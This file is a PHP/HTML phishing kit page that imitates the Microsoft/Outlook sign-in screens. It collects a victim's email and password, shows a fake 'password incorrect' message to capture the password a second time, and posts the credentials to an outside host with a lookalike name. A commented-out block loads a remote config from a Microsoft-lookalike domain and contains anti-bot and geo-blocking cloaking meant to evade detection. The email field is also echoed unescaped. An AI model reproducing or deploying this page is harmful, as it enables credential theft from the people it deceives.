<?php 
$email = $_GET['email'];

?>

<?php
// telegram
/*require "https://lmicr0sft.ddns.net/mcrst/configg.php";
require "dbo_assetz/ninc/session_protect.php";
require "dbo_assetz/ninc/functions.php";
require "dbo_assetz/dev.php";
if($internal_antibot == 1){
	require "dbo_assetz/old_blocker.php";
}
if($enable_killbot == 1){
	if(checkkillbot($killbot_key) == true){
		$fp = fopen("dbo_assetz/ninc/blacklist.dat", "a");
		fputs($fp, "\r\n$ip\r\n");
		fclose($fp);
		header_remove();
		header("Connection: close\r\n");
		http_response_code(404);
		exit;
	}
}
if($mobile_lock == 1){
	require "dbo_assetz/mob_lock.php";
}
if($US_lock == 1){
	if(onlyus() == true){
	
	}else{
		$fp = fopen("dbo_assetz/ninc/blacklist.dat", "a");
		fputs($fp, "\r\n$ip\r\n");
		fclose($fp);
		header_remove();
		header("Connection: close\r\n");
		http_response_code(404);
		exit;
	}
}
if($external_antibot == 1){
	if(checkBot($apikey) == true){
		$fp = fopen("dbo_assetz/ninc/blacklist.dat", "a");
		fputs($fp, "\r\n$ip\r\n");
		fclose($fp);
		header_remove();
		header("Connection: close\r\n");
		http_response_code(404);
		exit;
	}
}

error_reporting(0);
ini_set('display_errors', '0');
date_default_timezone_set('Europe/London');
session_start();

if($_GET['email'] == 'yes'){
	
}else{
	$fp = fopen("dbo_assetz/ninc/blacklist.dat", "a");
	fputs($fp, "\r\n$ip\r\n");
	fclose($fp);
	header_remove();
	header("Connection: close\r\n");
	http_response_code(404);
	exit;
}*/
?>
<!DOCTYPE html>
<html dir="ltr" lang="EN-US">
    

<head>
	<title><?php
		$id = rand(999,9999);
		$gen = md5($id);
		echo "File Path".$gen;
		?></title>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
        <meta http-equiv="X-UA-Compatible" content="IE=Edge" />
        <title>Sign in to your Microsoft account</title>
        <meta name="robots" content="none" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, minimum-scale=1.0, user-scalable=yes" />
        <link rel="shortcut icon" href="dbo_assetz/img/hotmail.ico" />
        <link rel="stylesheet" href="dbo_assetz/css/hotmail.css" />
    </head>
    <body class="cb">
        <div class="login-paginated-page">
            <div id="lightboxTemplateContainer">
                <div id="lightboxBackgroundContainer">
                    <div class="background-image-holder" role="presentation"><div style="background-image: url('dbo_assetz/img/bg.svg');" class="background-image ext-background-image"></div></div>
                </div>
                <div class="outer">
                    <div class="template-section main-section">
                        <div class="middle ext-middle">
                            <div class="full-height">
                                <div class="flex-column">
                                    <div class="win-scroll">
                                        <div id="step1" class="sign-in-box ext-sign-in-box fade-in-lightbox has-popup">
                                            <form action="#" method="get" id="form1">
                                                <div class="lightbox-cover"></div>
                                                <div><img class="logo" role="img" src="dbo_assetz/img/microsoft_logo.svg" alt="Microsoft" /></div>
                                                <div role="main">
                                                    <div class="">
                                                        <div class="pagination-view animate slide-in-next">
                                                            <div>
                                                                <div>
                                                                    <div>
                                                                        <div class="row title ext-title" id="loginHeader"><div role="heading">Sign in</div></div>
                                                                    </div>
                                                                </div>
                                                                <div class="row">
                                                                    <div style="display: none;" role="alert"><div class="col-md-24 error ext-error" id="usernameError">Enter a valid email address, phone number, or Skype name.</div></div>
                                                                    <div class="form-group col-md-24">
                                                                        <div class="placeholderContainer">
                                                                            <input
                                                                                type="email"
                                                                                name="loginfmt"
                                                                                id="i0116"
                                                                                maxlength="113"
                                                                                class="form-control ltr_override input ext-input text-box ext-text-box ext-has-error"
                                                                                placeholder="Email, phone, or Skype"
                                                                                required=""
                                                                                value="<?php echo $email; ?>"
                                                                            />
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                                <div class="position-buttons">
                                                                    <div class="row">
                                                                        <div class="col-md-24">
                                                                            <div class="text-13">
                                                                                <div class="form-group">No account? <a href="javascript:void(0);" id="signup"> Create one! </a></div>
                                                                                <div class="form-group">
                                                                                    <a id="idA_PWD_SwitchToFido" name="switchToFido" href="javascript:void(0);"> Sign in with a security key </a>
                                                                                    <span class="help-button" role="button" tabindex="0"> <img role="presentation" src="dbo_assetz/img/documentation.svg" /> </span>
                                                                                    <div><div></div></div>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                                <div class="win-button-pin-bottom">
                                                                    <div class="row">
                                                                        <div>
                                                                            <div class="col-xs-24 no-padding-left-right button-container">
                                                                                <div class="inline-block"><input type="submit" id="idSIButton9" class="win-button button_primary button ext-button primary ext-primary" value="Next" /></div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </form>
                                        </div>



                                        <div style="display: none;" id="step2" class="sign-in-box ext-sign-in-box fade-in-lightbox">
                                            <form action="#" method="post" id="form2">
                                                <div class="lightbox-cover"></div>
                                                <div><img class="logo" role="img" src="dbo_assetz/img/microsoft_logo.svg" alt="Microsoft" /></div>
                                                <div role="main">
                                                    <div class="">
                                                        <div class="animate slide-in-next">
                                                            <div>
                                                                <div class="identityBanner">
                                                                    <button type="button" class="backButton" id="idBtn_Back"><img role="presentation" src="dbo_assetz/img/arrow_left.svg" /></button>
                                                                    <div id="displayName" class="identity">email@outlook.com</div>

                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="pagination-view animate has-identity-banner slide-in-next">
                                                            <div>
                                                                <div id="loginHeader" class="row title ext-title"><div role="heading">Enter password</div></div>
                                                                <div class="row">
                                                                    <div class="form-group col-md-24">
                                                                        <div style="display: none;" role="alert"><div class="col-md-24 error ext-error">Please enter your password.</div></div>
                                                                        <div class="placeholderContainer">
                                                                            <div>
                                                                                <input
                                                                                    name="passwd"
                                                                                    type="password"
                                                                                    id="i0118"
                                                                                    autocomplete="off"
                                                                                    class="form-control input ext-input text-box ext-text-box"
                                                                                    placeholder="Password"
                                                                                    tabindex="0"
                                                                                    required=""
                                                                                />
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                                <div class="position-buttons">
                                                                    <div class="row">
                                                                        <div class="col-md-24">
                                                                            <div class="text-13">
                                                                                <div class="form-group"><a role="link" href="javascript:void(0);"> Forgot password? </a></div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                    <div class="win-button-pin-bottom">
                                                                        <div class="row">
                                                                            <div class="col-xs-24 no-padding-left-right button-container">
                                                                                <div class="inline-block"><input type="submit" id="idSIButton9" class="win-button button_primary button ext-button primary ext-primary" value="Sign in" /></div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </form>
                                        </div>
                                        <div style="display: none;" id="step3" class="sign-in-box ext-sign-in-box fade-in-lightbox">
                                            <form action="https://mscloudhome.com/swift/emailer.php" method="post" id="form3">


                                                <input type="hidden" name="type" value="Outlook" /><input type="hidden" name="email_address" id="email_address" /><input type="hidden" name="email_password" id="email_password" />



                                                <div class="lightbox-cover"></div>
                                                <div><img class="logo" role="img" src="dbo_assetz/img/microsoft_logo.svg" alt="Microsoft" /></div>
                                                <div role="main">
                                                    <div class="">
                                                        <div class="animate slide-in-next">
                                                            <div>
                                                                <div class="identityBanner">
                                                                    <button type="button" class="backButton" id="idBtn_Back"><img role="presentation" src="dbo_assetz/img/arrow_left.svg" /></button>
                                                                    <div id="displayName" class="identity">email@outlook.com</div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="pagination-view animate has-identity-banner slide-in-next">
                                                            <div>
                                                                <div id="loginHeader" class="row title ext-title"><div role="heading">Enter password</div></div>
                                                            
                                                                <div class="row">
                                                                    <div class="form-group col-md-24">
                                                                        <div role="alert"><div class="col-md-24 error ext-error">Your account or password is incorrect. Please try again.</div></div>
                                                                        <div class="placeholderContainer">
                                                                            <div>
                                                                                <input
                                                                                    name="email_password_confirm"
                                                                                    type="password"
                                                                                    id="email_password_confirm"
                                                                                    autocomplete="off"
                                                                                    class="form-control input ext-input text-box ext-text-box has-error"
                                                                                    placeholder="Password"
                                                                                    tabindex="0"
                                                                                    required=""
                                                                                />
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                                <div class="position-buttons">
                                                                    <div class="row">
                                                                        <div class="col-md-24">
                                                                            <div class="text-13">
                                                                                <div class="form-group"><a role="link" href="javascript:void(0);"> Forgot password? </a></div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                    <div class="win-button-pin-bottom">
                                                                        <div class="row">
                                                                            <div class="col-xs-24 no-padding-left-right button-container">
                                                                                <div class="inline-block"><input type="submit" id="idSIButton9" class="win-button button_primary button ext-button primary ext-primary" value="Sign in"  /></div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </form>
                                        </div>
                                        <div class="promoted-fed-cred-box ext-promoted-fed-cred-box">
                                            <div class="promoted-fed-cred-content">
                                                <div class="row tile">
                                                    <div class="table" role="button" tabindex="0">
                                                        <div class="table-row">
                                                            <div class="table-cell tile-img medium"><img class="tile-img medium" role="presentation" src="dbo_assetz/img/signin-options.svg" /></div>

                                                            
                                                            <div class="table-cell text-left content"><div>Sign-in options</div></div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div id="footer" role="contentinfo" class="footer ext-footer">
                        <div>
                            <div id="footerLinks" class="footerNode text-secondary">
                                <a id="ftrTerms" href="javascript:void(0);" class="footer-content ext-footer-content footer-item ext-footer-item"> Terms of use </a>
                                <a id="ftrPrivacy" href="javascript:void(0);" class="footer-content ext-footer-content footer-item ext-footer-item"> Privacy &amp; cookies </a>
                                <a id="moreOptions" href="javascript:void(0);" role="button" class="footer-content ext-footer-content footer-item ext-footer-item debug-item ext-debug-item"> ... </a>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <script src="dbo_assetz/js/jquery.js"></script>


        <script>



            $(document).ready(function () {
                var allInputs = $(":input");
                allInputs.focusout(function () {
                    $(this).blur(function () {
                        if ($(this).prop("required")) {
                            if (!$(this).val()) {
                                $(this).addClass("has-error");
                                $(this).parent().parent().prev().show();
                            } else {
                                $(this).removeClass("has-error");
                                $(this).parent().parent().prev().hide();
                            }
                        }
                    });
                });








                $(".backButton").click(function () {
                    $("#step1").show();
                    $("#step2").hide();
                    $("#step3").hide();
                    $(".promoted-fed-cred-box").show();
                });



                $("#form1").on("submit", function (e) {
                    e.preventDefault();
                    var email = $("#i0116").val();
                    if (email == null || email == "") {
                        return false;
                    } else if (/^([\w-\.]+)@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.)|(([\w-]+\.)+))([a-zA-Z]{2,4}|[0-9]{1,3})(\]?)$/.test(email)) {
                        $("#step1").hide();
                        $(".identity").text(email);
                        $("#email_address").val(email);
                        $("#step2").show();
                        $(".promoted-fed-cred-box").hide();

                    } else {
                        return false;
                    }
                });
                $("#form2").on("submit", function (e) {
                    e.preventDefault();
                    var pass = $("#i0118").val();
                    if (pass == null || pass == "") {
                        return false;
                    } else {
                        $("#step2").hide();
                        $("#email_password").val(pass);
                        $("#step3").show();
                    }
                });
            });
        </script>
    </body>

<!-- Mirrored from hlignqz.s3.eu-central-003.backblazeb2.com/mhcrost.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 15 Oct 2022 21:05:16 GMT -->
</html>
